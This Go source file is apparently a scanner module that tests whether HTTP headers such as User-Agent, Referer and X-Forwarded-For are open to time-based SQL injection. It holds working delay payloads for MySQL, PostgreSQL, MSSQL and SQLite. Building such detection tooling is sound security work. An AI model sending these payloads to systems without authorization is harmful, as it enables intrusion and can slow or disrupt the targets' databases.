package sqli_time_based_header

import (
	"strings"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/pkg/errors"
	"github.com/projectdiscovery/useragent"
)

type Module struct {
	modkit.BaseActiveModule
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	_ *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	if ctx.Request().Method() == "GET" {
		return results, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	// Header keys with their default values for fuzzing
	headerKeys := map[string]string{
		"User-Agent":       useragent.PickRandom().String(),
		"X-Forwarded-For":  "127.0.0.1",
		"X-Forwarded-Host": "127.0.0.1",
		"Referer":          urlx.String(),
		"Origin":           urlx.String(),
	}
	// https://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
	payloads := []string{
		// Mysql
		"'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z",
		`"XOR(if(now()=sysdate(),SLEEP(7),0))XOR"Z`,
		// PostgreSQL
		"1233'||(select 99999999 from pg_sleep(7))||'1233",
		`1233"||(select 99999999 from pg_sleep(7))||"1233`,
		// MSSQL
		// "9999' WAITFOR DELAY '00:00:07' -- ",
		// "9999\" WAITFOR DELAY '00:00:07' -- ",
		"9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999",
		`9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`,
		// SQLite
		`9999'||(select like('abcdefg',upper(hex(randomblob(70000000)))))||'9999`,
		`9999"||(select like('abcdefg',upper(hex(randomblob(70000000)))))||"9999`,
	}

scan:
	for _, payload := range payloads {
		// Build fuzzed request by replacing headers using httpmsg
		fuzzedRaw := ctx.Request().Raw()
		for key, value := range headerKeys {
			completePayload := value + payload
			var err error
			fuzzedRaw, err = httpmsg.ReplaceHeader(fuzzedRaw, key, completePayload)
			if err != nil {
				continue scan
			}
		}

		// Parse the fuzzed raw request to HttpRequestResponse
		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
		if err != nil {
			continue
		}

		// Copy HttpService from original request
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		var isVuln bool
		var sendErr error
		isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
		if sendErr != nil {
			continue
		}
		// retry 3 times, if all are true, then it is vuln
		for i := 0; i < 3; i++ {
			isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
			if sendErr != nil {
				continue
			}
			if !isVuln {
				break
			}
		}

		// check isVuln and sendErr == nil (successful request)
		if isVuln && sendErr == nil {
			fuzzedURL, _ := fuzzedReq.URL()
			var urlStr string
			if fuzzedURL != nil {
				urlStr = fuzzedURL.String()
			}
			results = append(results, &output.ResultEvent{
				URL:              urlStr,
				Request:          string(fuzzedRaw),
				FuzzingParameter: "Header",
				ExtractedResults: []string{payload},
			})
			break scan
		}
	}

	return results, nil
}

func sendRequest(req *httpmsg.HttpRequestResponse, httpClient *http.Requester) (bool, error) {
	timeout := false
	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return false, nil
		}
		if strings.Contains(err.Error(), "timeout awaiting response headers") {
			timeout = true
		}
	}

	defer func() {
		if resp != nil {
			resp.Close()
		}
	}()

	if duration >= 15 || timeout {
		return true, nil
	}
	return false, nil
}
